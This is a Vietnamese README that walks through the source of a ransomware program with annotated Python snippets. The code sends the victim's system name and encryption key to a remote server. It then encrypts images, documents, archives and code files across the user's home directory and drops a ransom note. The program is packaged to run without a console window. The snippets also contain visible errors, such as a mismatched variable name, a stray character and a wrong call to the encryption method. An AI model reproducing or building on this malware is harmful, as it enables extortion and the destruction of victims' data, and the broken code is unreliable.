 # RANSOMWARE
 *pyinstaller --onefile --noconsole encrypt.py*
 *Chương trình ransomware, một loại phần mềm độc hại thường sử dụng để mã hóa các tệp trên máy tính của người dùng và yêu cầu một khoản tiền chuộc để giải mã chúng.*
 ## SERVER
 - **1.** *Import các thư viện cần thiết: Chương trình sử dụng các thư viện như **os, sys, time, pathlib, socket** để thực hiện các chức năng liên quan đến tạo, mã hóa và gửi dữ liệu qua mạng.*

 ## ENCRYPT
 - **Class Ransomware:**
 *Đây là lớp chính của chương trình ransomware. Chứa các phương thức và thuộc tính để tạo kết nối đến máy chủ cũng như mã hóa các tệp trên hệ thống.*

 - **__init__:**
  *Khởi tạo các biến cần thiết như địa chỉ IP và cổng máy chủ, khóa riêng tư (Private) được tạo từ **Fernet**.*
 ```python
def __init__(self, host: str, port: str) -> None:
    self.host = host
    self.port = port
    self.server = socket(AF_INET, SOCK_STREAM)  # Tạo socket kết nối TCP
    self.key = Fernet.generate_key()  # Tạo khóa bí mật ngẫu nhiên
    self.Private = Fernet(self.key)  # Tạo đối tượng Fernet với khóa bí mật
    self.system = os.uname().sysname  # Lấy tên hệ thống
 ```

 - **ConnectServer:**
  *Kết nối đến máy chủ với số lần thử lại tối đa là 3. Nếu kết nối thành công, gửi thông tin hệ thống và khóa đến máy chủ. Nếu không kết nối được sau 3 lần thử lại, thực hiện khởi động lại chương trình.*
 ```python
def ConnectServer(self, connected=False) -> None:
    retries = 0
    while not connected and retries < 3:
        try:
            # Kết nối đến máy chủ với địa chỉ và cổng đã cung cấp
            self.server.connect((self.host, self.port))
            # Gửi thông tin hệ thống và khóa đến máy chủ
            self.server.sendall(f'{self.system}|{self.key.decode("utf-8")}'.encode('utf-8'))
            connected = True
        except:
            # Tăng số lần thử lại và chờ 100 giây trước khi thử lại
            retries += 1
            if retries < 3:
                sleep(100)
            else:
                # Nếu không kết nối được sau 3 lần thử lại, thực hiện khởi động lại chương trình
                os.execv(sys.executable, [sys.executable] + sys.argv)
        finally:
            # Đóng kết nối sau khi thực hiện xong
            self.server.close()
 ```
 - **Encrypted:**
  *Mã hóa các tệp trên hệ thống. Nó lặp qua tất cả các tệp trong hệ thống, mã hóa chúng bằng cách đọc và ghi dữ liệu từng phần. Lặp qua tất cả các tệp trong thư mục đã chỉ định và mã hóa từng tệp.*
 ```python
def Encrypted(self):
   for _, files in self.listfiles().items():
        for file in files:
            temp_file = file + '.temp'
 ```
 *Mở tệp gốc để đọc và tệp tạm thời để ghi*
 ```python
 try:
   with open(file, 'rb') as original_file, open(temp_file, 'wb') as encfile:
      while True:
         # Đọc dữ liệu từ tệp gốc thành các phần nhỏ có kích thước 4 MB
         hunk = original_file.read(4096 * 1024)
         if not chunk:
            break
         # Mã hóa từng phần nhỏ kích thước khóa là 32
         enc_chunk = self.Private.encrypt(chunk, 32)[0]
         # Ghi phần nhỏ đã mã hóa vào tệp tạm thời
         encfile.write(enc_chunk)
      os.replace(temp_file, file)
 except:
      pass  # Bỏ qua bất kỳ ngoại lệ nào
 finally:
   #Nếu tệp tạm thời tồn tại, xóa nó
   if os.path.exists(temp_file): 
      os.remove(temp_file)
 ```

 - **Contact:**
  *Tạo một tệp văn bản chứa thông điệp yêu cầu thanh toán chuộc.* 

 - **Listfiles:** 
 *Liệt kê các tệp trên hệ thống và phân loại chúng dựa trên phần mở rộng.*

 *Các phần mở rộng tệp được chia thành các danh mục như sau.*
 ```python
def Listfiles(self) -> dict:
    exts = {
        'images': ['.jpg', '.png'],
        'documents': ['.txt', '.docx'],
        'others': ['.rar', '.zip', '.mp4'],
        'code': ['.java', '.py', '.pyc', '.html', '.css']
    }
 ```
 *khởi tạo với các khóa là các danh mục từ exts và giá trị là danh sách rỗng.*
 *Nó sẽ được sử dụng để lưu trữ các tệp theo danh mục.*
 ```python
    file_categories = {category: [] for category in exts}S
 ```
 *Từ điển này ánh xạ từng phần mở rộng tệp đến danh mục tương ứng của nó.*
 *Điều này giúp dễ dàng xác định danh mục của một tệp dựa trên phần mở rộng của nó.*
 ```python
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}
 ```
 *Sử dụng* **Path.home().rglob('**~**')** *để liệt kê tất cả các tệp trong thư mục home của người dùng*
 *Kiểm tra nếu entry là một tệp **entry.is_file()**.*

 *Lấy phần mở rộng của tệp **entry.suffix.lower()**, chuyển nó thành chữ thường và gán vào biến ext.*

 *Nếu ext có trong extcategory, thêm đường dẫn của tệp entry vào danh sách tương ứng trong file_categories.*
 
 *trả về các tệp đã được phân loại.*
 ```python
    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))
    return file_categories
 ```
